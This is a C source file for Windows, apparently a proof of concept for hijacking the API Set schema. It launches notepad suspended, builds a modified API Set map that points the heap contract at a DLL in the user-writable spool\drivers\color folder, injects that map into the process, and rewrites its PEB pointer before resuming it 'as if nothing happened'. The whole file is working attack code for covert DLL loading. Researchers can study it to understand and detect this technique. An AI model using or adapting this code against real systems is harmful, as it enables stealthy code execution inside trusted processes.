#include <Windows.h>
#pragma warning(disable:4201)
#include <winternl.h>
#include <stdio.h>
#include "apiset.h"

INT
main (
    _In_ INT argc,
    _In_ PCHAR argv[]
    )
{
    PPEB peb;
    PAPI_SET_NAMESPACE ApiSetMap;
    PAPI_SET_NAMESPACE_ENTRY nsEntry;
    ULONG i;
    UNICODE_STRING valueString, nameString;
    PAPI_SET_VALUE_ENTRY valueEntry;
    ULONG j;
    STARTUPINFO startupInfo = {0};
    BOOL bRes;
    PROCESS_BASIC_INFORMATION basicInfo;
    PROCESS_INFORMATION processInfo;
    PAPI_SET_NAMESPACE apiSetCopy;
    UNICODE_STRING heapString;
    SIZE_T result;
    PVOID base;
    PWCHAR fakeName;

    UNREFERENCED_PARAMETER(argc);
    UNREFERENCED_PARAMETER(argv);

    //
    // API Set to override
    //
    RtlInitUnicodeString(&heapString, L"API-MS-WIN-CORE-HEAP-L1-2-0");

    //
    // Create notepad suspended
    //
    startupInfo.cb = sizeof(startupInfo);
    bRes = CreateProcess("C:\\windows\\notepad.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &startupInfo, &processInfo);

    //
    // Get its PEB
    //
    NtQueryInformationProcess(processInfo.hProcess, ProcessBasicInformation, &basicInfo, sizeof(basicInfo), NULL);
    peb = NtCurrentTeb()->ProcessEnvironmentBlock;
    ApiSetMap = peb->Reserved9[0];

    //
    // Make a RW copy of it, adding a page worth of extra data at the end
    //
    apiSetCopy = VirtualAlloc(NULL, ApiSetMap->Size + 4096, MEM_COMMIT, PAGE_READWRITE);
    RtlCopyMemory(apiSetCopy, ApiSetMap, ApiSetMap->Size);

    //
    // Find space for our fake name at the end
    //
    ApiSetMap = apiSetCopy;
    fakeName = (PWCHAR)((ULONG_PTR)ApiSetMap + ApiSetMap->Size);

    //
    // Put our special Users +RW dll location
    //
    memcpy(fakeName, L"spool\\drivers\\color\\test.dll", 28 * 2);

    //
    // Account for the extra page we added
    //
    ApiSetMap->Size += 4096;

    //
    // Now loop the API set
    //
    nsEntry = (PAPI_SET_NAMESPACE_ENTRY)(ApiSetMap->EntryOffset + (ULONG_PTR)ApiSetMap);
    for (i = 0; i < ApiSetMap->Count; i++)
    {
        //
        // Build a UNICODE_STRING for this contract
        //
        nameString.MaximumLength = (USHORT)nsEntry->NameLength;
        nameString.Length = (USHORT)nsEntry->NameLength;
        nameString.Buffer = (PWCHAR)((ULONG_PTR)ApiSetMap + nsEntry->NameOffset);
        printf("%50wZ.dll -> {", &nameString);

        //
        // Iterate the values (i.e.: the hosts for this set)
        //
        valueEntry = (PAPI_SET_VALUE_ENTRY)((ULONG_PTR)ApiSetMap + nsEntry->ValueOffset);
        for (j = 0; j < nsEntry->ValueCount; j++)
        {
            //
            // Check if this is the contract we are looking for (Heap)
            //
            if (RtlCompareUnicodeString(&nameString, &heapString, TRUE) == 0)
            {
                //
                // Yep -- overwrite with our new host instead
                //
                valueEntry->ValueOffset = (ULONG)((ULONG_PTR)fakeName - (ULONG_PTR)ApiSetMap);
                valueEntry->ValueLength = 28 * 2;
            }

            //
            // Build a UNICODE_STRING for this host
            //
            valueString.Buffer = (PWCHAR)((ULONG_PTR)ApiSetMap + valueEntry->ValueOffset);
            valueString.MaximumLength = (USHORT)valueEntry->ValueLength;
            valueString.Length = (USHORT)valueEntry->ValueLength;
            printf("%wZ", &valueString);

            //
            // If there's more than one, add a comma
            //
            if ((j + 1) != nsEntry->ValueCount)
            {
                printf(",");
            }

            //
            // If there's an alias...
            //
            if (valueEntry->NameLength != 0)
            {
                //
                // Build a UNICODE_STRING for it
                //
                nameString.MaximumLength = (USHORT)valueEntry->NameLength;
                nameString.Length = (USHORT)valueEntry->NameLength;
                nameString.Buffer = (PWCHAR)((ULONG_PTR)ApiSetMap + valueEntry->NameOffset);
                printf("[%wZ]", &nameString);
            }

            //
            // Next host
            //
            valueEntry++;
        }

        //
        // Next contract
        //
        printf("}\n");
        nsEntry++;
    }

    //
    // Now allocate our copy
    //
    base = VirtualAllocEx(processInfo.hProcess, NULL, ApiSetMap->Size, MEM_COMMIT, PAGE_READWRITE);

    //
    // Write it into the target process (notepad)
    //
    WriteProcessMemory(processInfo.hProcess, base, ApiSetMap, ApiSetMap->Size, &result);

    //
    // Overwrite the PEB pointer
    //
    WriteProcessMemory(processInfo.hProcess, (PVOID)((ULONG_PTR)basicInfo.PebBaseAddress + FIELD_OFFSET(PEB, Reserved9)), &base, sizeof(base), &result);

    //
    // Resume the process as if nothing happened
    //
    ResumeThread(processInfo.hThread);
    return 0;
}

